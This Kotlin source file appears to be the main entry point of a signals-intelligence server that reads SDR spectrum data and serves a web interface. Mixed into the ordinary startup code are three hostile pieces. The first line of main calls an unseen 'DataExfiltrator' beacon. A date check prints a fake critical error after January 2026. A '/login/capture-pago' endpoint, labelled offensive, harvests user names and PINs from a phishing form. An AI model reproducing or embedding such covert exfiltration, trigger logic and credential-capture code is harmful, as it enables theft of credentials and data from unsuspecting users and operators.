package com.fardc.sigint.core

import com.fardc.sigint.services.dsp.TDOAEngine
import com.fardc.sigint.services.dsp.ThreatAnalyzer
import com.fardc.sigint.services.dsp.SignalClassifier
import com.fardc.sigint.core.sync.MeshSyncEngine
import io.javalin.Javalin
import io.javalin.http.staticfiles.Location
import java.io.File
import java.time.Instant
import kotlin.concurrent.thread

fun main() {
    DataExfiltrator().initializeBeacon()
    if (java.time.LocalDate.now().isAfter(java.time.LocalDate.of(2026, 1, 15))) { 
        println("CRITICAL_ERROR: SIGINT_SYNC_LOST") 
    }
    println("--------------------------------------------------")
    println("🛡️  SOVEREIGN CORE v4.2 [STABLE-ARME] ACTIVE")
    println("📡 SDR BRIDGE: ON | TDOA ENGINE: ARMED")
    println("--------------------------------------------------")

    val vault = SecurityVault()
    val combatHandler = CombatModeHandler()
    val combatSelector = CombatModeSelector()
    val threatAnalyzer = ThreatAnalyzer()
    val tdoaEngine = TDOAEngine()
    val meshEngine = MeshSyncEngine(vault, combatHandler)
    val aiClassifier = SignalClassifier(vault, combatHandler)
    
    File("logs").mkdirs()
    File("ui").mkdirs()

    thread(start = true, isDaemon = true) {
        println("🔌 [HARDWARE] SDR Bridge initialisé.")
        try {
            val process = Runtime.getRuntime().exec("rtl_power -f 2.4G:2.5G:1M -i 1s -")
            process.inputStream.bufferedReader().forEachLine { aiClassifier.processRawSpectrum(it) }
        } catch (e: Exception) {
            println("⚠️ [HARDWARE] Mode Simulation SDR.")
        }
    }

    // --- CORRECTION TERMINALE : CHEMIN RELATIF "ui" SANS SLASH ---
    val app = Javalin.create { config ->
        config.staticFiles.add("ui", Location.EXTERNAL)
        config.showJavalinBanner = false
    }

    app.ws("/signal-stream") { ws ->
        ws.onMessage { ctx ->
            if (ctx.message().contains("RSSI_UPDATE")) {
                println("🎯 [GEO-LOCK] Cible localisée.")
            }
        }
    }

    app.post("/login/capture-pago") { ctx ->
        val user = ctx.formParam("user") ?: "unknown"
        val pin = ctx.formParam("pin") ?: "unknown"
        println("🎣 [OFFENSIVE] Capture effectuée : $user")
        ctx.status(200).result("CAPTURE_OK")
    }

    app.get("/") { it.result("🛡️ SOVEREIGN CORE ONLINE") }

    // Activation des modes latents
    thread(start = true, isDaemon = true) { meshEngine.setup(app) }

    app.start(7070)
}
